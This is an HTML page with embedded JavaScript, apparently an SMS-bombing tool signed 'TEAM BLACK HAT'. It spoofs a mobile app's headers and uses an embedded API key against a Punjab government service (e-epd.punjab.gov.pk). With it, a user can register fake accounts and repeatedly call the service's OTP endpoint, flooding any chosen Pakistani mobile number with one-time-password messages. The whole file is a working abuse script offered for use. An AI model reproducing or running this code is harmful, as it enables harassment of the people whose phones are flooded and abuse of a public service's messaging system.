<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Sender</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="text"], input[type="number"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #45a049;
        }
        #output {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background-color: #f9f9f9;
            min-height: 100px;
            max-height: 300px;
            overflow-y: auto;
        }
        .log-entry {
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #eee;
        }
        .success {
            color: green;
        }
        .error {
            color: red;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>OTP Sender</h1>
        
        <div class="form-group">
            <label>Choose an option:</label>
            <div>
                <button onclick="showRegisterForm()">1) Register New User</button>
                <button onclick="showOtpForm()">2) Regenerate OTP Multiple Times</button>
            </div>
        </div>
        
        <div id="registerForm" style="display: none;">
            <div class="form-group">
                <label for="regMobile">Mobile Number:</label>
                <input type="text" id="regMobile" placeholder="e.g. 03211234567">
            </div>
            <button onclick="registerUser()">Register</button>
        </div>
        
        <div id="otpForm" style="display: none;">
            <div class="form-group">
                <label for="otpMobile">Mobile Number:</label>
                <input type="text" id="otpMobile" placeholder="e.g. 03211234567">
            </div>
            <div class="form-group">
                <label for="otpCount">How many times to send OTP:</label>
                <input type="number" id="otpCount" value="1" min="1">
            </div>
            <button onclick="sendOtpMultipleTimes()">Send OTP</button>
        </div>
        
        <div id="output"></div>
    </div>

    <script>
        // Base URL
        const base_url = "https://e-epd.punjab.gov.pk";
        
        // Common Headers
        const headers = {
            'app': 'sans',
            'version': '28',
            'Content-Type': 'application/json; charset=UTF-8',
            'Host': 'e-epd.punjab.gov.pk',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'User-Agent': 'okhttp/4.5.0'
        };
        
        function showRegisterForm() {
            document.getElementById('registerForm').style.display = 'block';
            document.getElementById('otpForm').style.display = 'none';
        }
        
        function showOtpForm() {
            document.getElementById('registerForm').style.display = 'none';
            document.getElementById('otpForm').style.display = 'block';
        }
        
        function log(message, className = '') {
            const output = document.getElementById('output');
            const entry = document.createElement('div');
            entry.className = `log-entry ${className}`;
            entry.textContent = message;
            output.appendChild(entry);
            output.scrollTop = output.scrollHeight;
        }
        
        async function registerUser() {
            const mobile_number = document.getElementById('regMobile').value;
            
            if (!mobile_number.startsWith('03') || mobile_number.length !== 11) {
                log('Invalid Pakistani mobile number format', 'error');
                return;
            }
            
            const data = {
                "cnic": "",
                "email": "",
                "name": "Ali khan",
                "mobile_number": mobile_number,
                "password": "Abcd1234$@.",
                "user_type": "3",
                "apiKey": "cs3pqO4xW6zFsRH5kaLomFPJHsHdQrWe",
                "imei": "123",
                "latitude": "0.0",
                "longitude": "0.0",
                "versionCode": "3"
            };
            
            try {
                log(`Registering user with mobile: ${mobile_number}...`);
                const response = await fetch(`${base_url}/api/register`, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify(data)
                });
                
                const result = await response.json();
                log(`Registration response: ${JSON.stringify(result)}`, 'success');
            } catch (error) {
                log(`Error: ${error.message}`, 'error');
            }
        }
        
        async function sendOtp(mobile_number) {
            const data = {
                "mobile_number": mobile_number
            };
            
            try {
                const response = await fetch(`${base_url}/api/sns_generate_mobile_otp`, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify(data)
                });
                
                const result = await response.json();
                return result;
            } catch (error) {
                throw error;
            }
        }
        
        async function sendOtpMultipleTimes() {
            const mobile_number = document.getElementById('otpMobile').value;
            const otp_count = parseInt(document.getElementById('otpCount').value);
            
            if (!mobile_number.startsWith('03') || mobile_number.length !== 11) {
                log('Invalid Pakistani mobile number format', 'error');
                return;
            }
            
            for (let i = 1; i <= otp_count; i++) {
                log(`Sending OTP #${i} to ${mobile_number}...`);
                
                try {
                    const result = await sendOtp(mobile_number);
                    log(`OTP sent successfully! Response: ${JSON.stringify(result)}`, 'success');
                } catch (error) {
                    log(`Error sending OTP: ${error.message}`, 'error');
                }
                
                log("----------------------------------------");
                log("Developer: TEAM BLACK HAT");
                log("----------------------------------------");
                log("OLD-HACKER");
                
                if (i < otp_count) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }
    </script>
</body>
</html>
